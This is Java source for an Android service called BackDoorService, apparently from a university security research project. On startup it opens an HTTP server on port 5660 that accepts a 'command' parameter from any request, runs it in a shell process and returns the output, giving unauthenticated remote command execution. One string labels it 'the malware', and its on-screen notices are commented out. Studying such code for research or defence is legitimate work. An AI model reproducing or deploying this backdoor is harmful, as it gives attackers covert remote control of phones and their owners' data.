package edu.ncsu.soc.rms;

import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.Properties;

import android.app.Service;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import android.widget.Toast;

import com.Nano.NanoHTTPD;

public class BackDoorService extends Service {
	private static final String TAG = "BackDoorService";
	private static final int BUFF_LEN = 1023;

	private ReceiverServer server;
	private Handler handler = new Handler();

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public void onCreate() {

		//Toast.makeText(this, "BackDoor Service created", Toast.LENGTH_LONG)
				//.show();
		Log.d(TAG, "onCreate");
		Log.d(TAG, "Trying to execute BackDoor CODE");
		// Start the server on create()
		try {
			server = new ReceiverServer(5660);
		} catch (IOException e) {
			e.printStackTrace();
		}

	}

	@Override
	public void onDestroy() {
		//Toast.makeText(this, "backDoor service OFF", Toast.LENGTH_LONG).show();
		Log.d(TAG, "onDestroy");
		server.stop();
		stopSelf();
		super.onDestroy();
		stopSelf();

	}

	@Override
	public void onStart(Intent intent, int startid) {
		// Toast.makeText(this, "Now Listening", Toast.LENGTH_LONG).show();

	}

	public static String execute_code(String command) {
		try {

			DataOutputStream stdin = new DataOutputStream(
					HackService.p.getOutputStream());

			Log.d("Command", command);
			
			
			
			stdin.writeBytes(command + "\n");
			//stdin.writeBytes("echo \"Done\" \n");
			InputStream stdout = HackService.p.getInputStream();
			byte[] buffer = new byte[BUFF_LEN];
			int read;
			String out = new String();
			// read method will wait forever if there is nothing in the stream
			// so we need to read it in another way than
			// while((read=stdout.read(buffer))>0)
			while (true) {
				read = stdout.read(buffer);
				Log.d("Read count", "" + read);
				out += new String(buffer, 0, read);
				// Log.d("Command output", out);
				if (read < BUFF_LEN) {
					// we have read everything
					break;
				}
			}
			Log.e("Size of out in backdoor", " " + out.length() + ' ');
			Log.e("OUT of backdoor", out);
			return out;

		} catch (IOException e) {
			e.printStackTrace();
			return "Error";
		}

	}

	public void startServer() {
		Log.v("Announcement", "Starting server");

		try {
			ReceiverServer rs = new ReceiverServer(5660);
			Log.v("Announcement", "Server Started");
		} catch (IOException e) {
			Log.d("Exception", "Exception thrown while starting server " + e);
		}

		Log.v("Announcement", "Outside of server starting statement");
	}

	public class ReceiverServer extends NanoHTTPD {

		public ReceiverServer(int port) throws IOException {

			super(port, null);
			Log.v("ReceiverServer", "Super Started");
			Toast.makeText(getBaseContext(), "Receiver Started", 4).show();

		}

		public Response serve(String uri, String method, Properties header,
				Properties parms, Properties files) {

			// Toast.makeText(getBaseContext(), "Message Received", 4).show();
			System.out.println("Yes got it");
			Log.v("METHOD", method);
			Log.v("Parms", parms.getProperty("command"));
			String command=parms.getProperty("command");

			handler.post(new Runnable() {
				@Override
				public void run() {
					Log.v("ReceiverServer", "Got one");
				}
			});
			
			String output=execute_code(command);

			final String html = "<html><head><head><body><h1>Hello, World. This is the malware</h1></body></html>";
			return new NanoHTTPD.Response(HTTP_OK, MIME_HTML, output);
		}

	}

}
